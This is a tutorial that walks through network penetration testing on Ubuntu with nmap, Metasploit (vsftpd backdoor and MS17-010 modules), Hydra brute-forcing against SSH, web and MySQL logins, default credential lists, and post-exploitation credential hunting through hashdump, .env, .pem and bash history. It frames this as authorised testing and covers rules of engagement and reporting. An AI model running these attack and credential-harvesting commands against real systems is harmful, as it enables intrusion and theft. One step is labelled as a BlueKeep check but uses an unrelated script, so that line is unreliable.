# How to Conduct Network Penetration Testing on Ubuntu

Author: [nawazdhandala](https://github.com/nawazdhandala)

Tags: Ubuntu, Penetration Testing, Security, Networking, Ethical Hacking

Description: A systematic guide to conducting network penetration testing on Ubuntu, covering reconnaissance, enumeration, vulnerability assessment, exploitation, and post-engagement reporting.

---

Network penetration testing systematically evaluates a network's security by attempting to exploit vulnerabilities in the same way an attacker would. The goal is to identify and document security weaknesses before malicious actors find them. This guide covers the methodology and tools for network penetration testing on Ubuntu. Only test networks you own or have explicit written authorization to test.

## Setting Up the Testing Environment

Before starting any engagement, prepare your tools:

```bash
# Install core network testing tools
sudo apt update
sudo apt install nmap masscan netcat-openbsd nikto hydra john \
  smbclient enum4linux onesixtyone snmp sqlmap curl wget \
  wireshark tcpdump traceroute whois dnsutils

# Install additional tools from repositories
sudo apt install metasploit-framework  # Or use the official installer

# Set up a virtual environment for Python tools
python3 -m venv /opt/pentesting
source /opt/pentesting/bin/activate
pip install impacket requests scapy
```

## Phase 1: Reconnaissance

Gather information about the target without directly interacting with the network:

```bash
# Passive DNS enumeration
dig example.com ANY
dig +short example.com MX
dig +short example.com NS
dig +axfr @ns1.example.com example.com  # Zone transfer attempt

# Reverse DNS lookups
nmap -sL 192.168.1.0/24  # List scan - reverse DNS only, no packets sent

# WHOIS information
whois example.com
whois 192.168.1.1

# Find subdomains (passive methods)
# Using certificate transparency logs
curl -s "https://crt.sh/?q=%.example.com&output=json" \
  | python3 -c "import sys,json; [print(x['name_value']) for x in json.load(sys.stdin)]" \
  | sort -u

# DNS brute forcing
# Install dnsrecon or subfinder
sudo apt install dnsrecon
dnsrecon -d example.com -t brt -D /usr/share/wordlists/subdomains.txt
```

## Phase 2: Network Scanning

Identify live hosts and open ports:

```bash
# Quick ping sweep to find live hosts
nmap -sn 192.168.1.0/24 -oG /tmp/ping_sweep.gnmap

# Parse results to get live hosts
grep "Up" /tmp/ping_sweep.gnmap | awk '{print $2}' > /tmp/live_hosts.txt
cat /tmp/live_hosts.txt

# For large networks, masscan is faster (then verify with nmap)
sudo masscan -p1-65535 192.168.1.0/24 --rate=1000 -oG /tmp/masscan_results.txt

# Detailed port scan on discovered hosts
nmap -sV -sC -O -p- \
  --open \
  -iL /tmp/live_hosts.txt \
  -oA /tmp/detailed_scan \
  --max-retries 2 \
  --host-timeout 30m

# Quick targeted scan of top 1000 ports for initial triage
nmap -sV --top-ports 1000 192.168.1.0/24 -oA /tmp/quick_scan

# Service version detection with scripts on specific hosts
nmap -sV -sC -p 22,80,443,3389,445,3306 192.168.1.100 -oA /tmp/targeted_scan

# View results
cat /tmp/detailed_scan.nmap
```

Scan output organization:

```bash
# Create organized output directory
ENGAGEMENT="client_2026_03"
mkdir -p /tmp/${ENGAGEMENT}/{scans,exploits,loot,reports}

# Run comprehensive scan with output to organized location
nmap -sV -sC -A \
  -iL /tmp/live_hosts.txt \
  -oA /tmp/${ENGAGEMENT}/scans/full_scan \
  --script "default,vuln" \
  --script-timeout 60s
```

## Phase 3: Service Enumeration

Dig deeper into discovered services:

```bash
# SMB enumeration (Windows shares, users, policies)
smbclient -L //192.168.1.100 -N  # List shares without auth
smbclient //192.168.1.100/share -N  # Connect without auth

enum4linux -a 192.168.1.100  # Comprehensive Windows enumeration

# SNMP enumeration
onesixtyone -c /usr/share/doc/onesixtyone/dict.txt 192.168.1.0/24
snmpwalk -v 2c -c public 192.168.1.100

# RPC enumeration
nmap -sV -p 111 --script rpcinfo 192.168.1.100

# Web application enumeration
nikto -h http://192.168.1.100 -o /tmp/${ENGAGEMENT}/scans/nikto_100.txt

# Directory enumeration
sudo apt install gobuster
gobuster dir \
  -u http://192.168.1.100 \
  -w /usr/share/wordlists/dirb/common.txt \
  -o /tmp/${ENGAGEMENT}/scans/gobuster_100.txt

# DNS zone transfer attempt
dig axfr @192.168.1.100 example.local

# LDAP enumeration (Active Directory)
nmap -p 389 --script ldap-search 192.168.1.100
```

## Phase 4: Vulnerability Assessment

Map discovered services to known vulnerabilities:

```bash
# Nmap vulnerability scripts
nmap -sV --script vuln 192.168.1.100 -oA /tmp/${ENGAGEMENT}/scans/vuln_scan

# Check for EternalBlue (MS17-010)
nmap -p 445 --script smb-vuln-ms17-010 192.168.1.100

# Check for BlueKeep (CVE-2019-0708)
nmap -p 3389 --script rdp-vuln-ms12-020 192.168.1.100

# Check for Heartbleed
nmap -p 443 --script ssl-heartbleed 192.168.1.100

# Check SSL/TLS configuration
nmap -p 443 --script ssl-enum-ciphers 192.168.1.100
testssl https://192.168.1.100

# Check for common web vulnerabilities
sqlmap -u "http://192.168.1.100/login.php?id=1" \
  --dbs --batch \
  --output-dir /tmp/${ENGAGEMENT}/scans/

# Use searchsploit to find exploits for discovered services
sudo apt install exploitdb
searchsploit "OpenSSH 7.4"
searchsploit "Apache 2.4.29"
searchsploit "vsftpd 2.3.4"
```

## Phase 5: Exploitation

Attempt to exploit identified vulnerabilities (authorized testing only):

```bash
# Launch Metasploit
msfconsole

# Import Nmap scan results to Metasploit database
msf6 > db_import /tmp/${ENGAGEMENT}/scans/full_scan.xml
msf6 > hosts
msf6 > services -p 445

# Check for vulnerable SMB
msf6 > use auxiliary/scanner/smb/smb_ms17_010
msf6 auxiliary(scanner/smb/smb_ms17_010) > set RHOSTS 192.168.1.0/24
msf6 auxiliary(scanner/smb/smb_ms17_010) > run

# Exploit a vulnerable FTP server (vsftpd backdoor)
msf6 > use exploit/unix/ftp/vsftpd_234_backdoor
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set RHOSTS 192.168.1.100
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > run

# SSH credential testing
msf6 > use auxiliary/scanner/ssh/ssh_login
msf6 auxiliary(scanner/ssh/ssh_login) > set RHOSTS 192.168.1.100
msf6 auxiliary(scanner/ssh/ssh_login) > set USERNAME root
msf6 auxiliary(scanner/ssh/ssh_login) > set PASS_FILE /tmp/passwords.txt
msf6 auxiliary(scanner/ssh/ssh_login) > run
```

## Credential Testing

Test for default and weak credentials:

```bash
# Hydra for credential testing against multiple services
# SSH
hydra -l admin -P /usr/share/wordlists/rockyou.txt \
  192.168.1.100 ssh \
  -t 4 \
  -o /tmp/${ENGAGEMENT}/exploits/ssh_creds.txt

# HTTP login form
hydra -l admin -P /usr/share/wordlists/rockyou.txt \
  192.168.1.100 \
  http-post-form "/login.php:username=^USER^&password=^PASS^:Invalid credentials" \
  -t 4

# MySQL
hydra -l root -P /usr/share/wordlists/rockyou.txt \
  192.168.1.100 mysql

# FTP
hydra -l anonymous -p anonymous 192.168.1.100 ftp

# Common default credentials to try manually:
# admin:admin, admin:password, admin:123456
# root:root, root:password, root:toor
```

## Post-Exploitation and Lateral Movement

After gaining initial access, document what an attacker could do:

```bash
# From a Meterpreter session
meterpreter > sysinfo
meterpreter > getuid
meterpreter > ps
meterpreter > hashdump  # Requires admin privileges

# Local enumeration via shell
# What sudo permissions does the user have?
sudo -l

# Search for sensitive files
find / -name "*.conf" -readable 2>/dev/null | head -20
find / -name "*.pem" -readable 2>/dev/null
find / -name ".env" -readable 2>/dev/null

# Check for stored credentials
cat ~/.bash_history
cat ~/.ssh/known_hosts
ls ~/.ssh/

# Network discovery from compromised host
ip route
arp -a
ss -tlnp
```

## Creating the Penetration Test Report

The report is the primary deliverable. Document findings systematically:

```bash
# Create a findings directory
mkdir -p /tmp/${ENGAGEMENT}/reports

# Document each finding with:
# - Vulnerability name
# - CVSS score
# - Affected systems
# - Evidence (screenshots, command output)
# - Remediation recommendation

cat << 'EOF' > /tmp/${ENGAGEMENT}/reports/finding_template.md
# Finding: [Vulnerability Name]

## Severity
Critical / High / Medium / Low / Informational

## CVSS Score
Base: X.X (CVSSv3)

## Affected Systems
- 192.168.1.100 (port 445/tcp)

## Description
[Describe the vulnerability]

## Evidence
\`\`\`
[Command output or screenshot description]
\`\`\`

## Impact
[What an attacker could do with this vulnerability]

## Remediation
[How to fix it - specific, actionable steps]

## References
- CVE-XXXX-XXXX
- https://vendor-advisory-url
EOF
```

## Scope and Rules of Engagement

Before starting, document:

```bash
# Create rules of engagement document
cat << 'EOF' > /tmp/${ENGAGEMENT}/rules_of_engagement.txt
Engagement Details
==================
Client: [Client Name]
Test Period: [Start Date] to [End Date]
Authorized Tester: [Your Name]

In-Scope Networks:
- 192.168.1.0/24
- 10.0.0.0/24

Out-of-Scope:
- Production database servers
- Third-party hosted services
- Systems outside listed subnets

Contact during testing:
Primary: [Name] - [Phone]
Emergency: [Name] - [Phone]

Authorized test types:
- Network scanning
- Vulnerability assessment
- Exploitation of found vulnerabilities
- No social engineering
- No physical testing

Data handling:
- All data destroyed after report delivery
- No exfiltration of real data
EOF
```

## Cleaning Up

After the engagement:

```bash
# Remove any tools or files placed on target systems
# Document what was left and remove it

# Clean your own test notes with sensitive info
shred -u /tmp/${ENGAGEMENT}/exploits/*.txt

# Archive the engagement files
tar -czf /secure_storage/${ENGAGEMENT}_$(date +%Y%m%d).tar.gz /tmp/${ENGAGEMENT}/

# Delete working directory
rm -rf /tmp/${ENGAGEMENT}/
```

A well-executed penetration test provides concrete, actionable findings. The methodology matters as much as the tools - systematic coverage, thorough documentation, and clear remediation guidance are what make a penetration test valuable to the client.
